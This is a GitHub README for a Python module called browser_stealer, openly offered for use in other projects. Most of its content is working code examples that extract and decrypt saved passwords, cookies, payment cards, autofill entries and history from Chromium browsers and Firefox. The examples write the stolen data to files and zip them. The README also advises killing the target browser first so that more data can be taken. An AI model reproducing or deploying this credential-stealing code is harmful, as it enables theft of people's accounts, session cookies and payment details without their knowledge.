<h1 align="center">Browser Stealer<h1>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/last-commit/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/stars/Josakko/browser_stealer" </a>
  <img src="https://img.shields.io/github/forks/Josakko/browser_stealer" </a>
</p>

<h4 align="center">
  <span style="color: #fff; font-weight: bold;">Browser Stealer</span>
  <span style="color: #fff; font-weight: normal;">v2.0.0</span>
</h4>

```
pip install browser_stealer
```

## Installation

Since module got removed from pypi you have to install it manually, to install it download `.whl` file (`browser_stealer-<version>-py3-none-any.whl`) from [here](https://github.com/Josakko/browser_stealer/releases), next open terminal on the location where you downloaded `browser_stealer-<version>-py3-none-any.whl` and run following command:
- *IMPORTANT* - Do not rename the downloaded file, that might prevent you from installing the module
  
```
pip install browser_stealer-<version>-py3-none-any.whl
```

After running the command you can import and use browser stealer in your own projects!

## Code Examples

- **RECOMMENDED**: before stealing anything its recommended to kill the targeted browser because some data wont be stolen if browser is running

##### Chromium

Simple example for stealing data from profile "Default" of browsers: Chromium, Chrome, Opera, Opera GX, Brave, Edge
```py
import browser_stealer

browser_stealer.run()
```

Or if you want to add your own chromium based browser or other profiles for existing ones:

```py
import browser_stealer, os


def MyBrowser():
    browser_stealer.fetch_passwords(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Login Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.decrypt_fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.fetch_cookies(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Network\Cookies"))
    browser_stealer.fetch_history(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
    browser_stealer.fetch_downloads(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\History"))
    browser_stealer.fetch_bookmarks(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Bookmarks"))
    browser_stealer.fetch_payment(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"), os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Local State"))
    browser_stealer.fetch_autofill(os.path.join(os.environ["USERPROFILE"], r"AppData\Local\%FOLDER%\%FOLDER%\User Data\Default\Web Data"))

    browser_stealer.Utils().zip("MyBrowser.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
    browser_stealer.Utils().delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])

MyBrowser()
```

In this example you have to replace `%FOLDER%\%FOLDER%` with one for your specific browser, so for example for chrome you would use `Google\Chrome`, and also replace `%PROFILE%` whit profile you want to target so for example you could replace it with `Default` if you want to target Default profile

##### Firefox

```py
import os
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad
import browser_stealer


def firefox():
    utils = browser_stealer.Utils()
    profiles = browser_stealer.FirefoxUtils(os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Mozilla\Firefox\profiles.ini")).fetch_profiles()


    for profile in profiles[0]:
        profile_path = os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Mozilla\Firefox", profile[2])
        path = profile_path if profile[1] else profile[2]

        b_st = browser_stealer.Firefox(path)

        key = b_st.get_key()
        algo = b_st.get_algo()
        
        ff_data = browser_stealer.FirefoxData(path)

        login_data = ff_data.fetch_passwords()
        cookies = ff_data.fetch_cookies()
        history = ff_data.fetch_history()
        autofill = ff_data.fetch_autofill()
        bookmarks = ff_data.fetch_bookmarks()
        downloads = ff_data.fetch_downloads()
        
        for cookie in cookies:
            #name, value, host, path, isSecure, isHttpOnly, expiry, lastAccessed, creationTime
            txt = f"\nName: {cookie[0]}\nValue: {cookie[1]}\nHost: {cookie[2]}\nPath: {cookie[3]}\nIs Secure: {cookie[4]}\nIs http only: {cookie[5]}\nExpiry: {cookie[6]}\nLast accessed: {cookie[7]}\nCreation time: {cookie[8]}\n"
            utils.store_data(file="cookies.txt", data=txt)

        for visited in history:
            #url, title, visit_count, last_visit_date
            txt = f"\nURL: {visited[0]}\nTitle: {visited[1]}\nVisit count: {visited[2]}\nLast visit: {visited[3]}\n"
            utils.store_data(file="history.txt", data=txt)

        for instance in autofill:
            #fieldname, value, timesUsed, firstUsed, lastUsed
            txt = f"\nFieldname: {instance[0]}\nValue: {instance[1]}\nTimes used: {instance[2]}\nFirst used: {instance[3]}\nLast used: {instance[4]}\n"
            utils.store_data(file="autofill.txt", data=txt)

        for bookmark in bookmarks:
            #title, dateAdded, lastModified
            txt = f"\nTitle: {bookmark[0]}\nDate Added: {bookmark[1]}\nLast modified: {bookmark[2]}\n"
            utils.store_data(file="bookmarks.txt", data=txt)

        for download in downloads:
            #path, metadata, dateAdded
            txt = f"\nPath: {download[0]}\nMetadata: {download[1]}\nDate downloaded: {download[2]}\n"
            utils.store_data(file="downloads.txt", data=txt)

        key = b_st.get_key()
        algo = b_st.get_algo()
        login_data = ff_data.fetch_passwords()
    

        if algo != "1.2.840.113549.1.12.5.1.3" and algo != "1.2.840.113549.1.5.13":
            return
        
        for login in login_data:
            data = ""

            data += f"\nURL: {login[2]}"

            iv = login[0][1]
            cipher_text = login[0][2] 
            username = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(cipher_text), 8).decode()
            data += f"\nUsername: {username}"

            iv = login[1][1]
            cipher_text = login[1][2] 
            password = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(cipher_text), 8).decode()
            data += f"\nPassword: {password}"

            data += f"\nTimes Used: {login[5]}"

            utils.store_data(file=f"passwords.txt", data=f"{data}\n")


        utils.store_data(file=f"passwords.txt", data=f"\nKEY: {key}\nALGO: {algo}\n")
        files = ["passwords.txt", "cookies.txt", "history.txt", "bookmarks.txt", "autofill.txt", "downloads.txt"]
        utils.zip("Firefox.zip", files)
        utils.delete_files(files)

firefox()
```

Here we have an function that you could modify for your own firefox fork...

```py
import browser_stealer

browser_stealer.firefox_steal()
```

This is how to achieve the same thing but in only two lines...

## [Video Tutorial](https://youtube.com) (comming soon)

## Need Help?

If you need help contact me on my [discord server](https:\\discord.gg\xgET5epJE6) or create [issue](https:\\github.com\Josakko\DiscordReverseShell\issues).

## Contributors

Big thanks to all of the amazing people (only me) who have helped by contributing to this project!
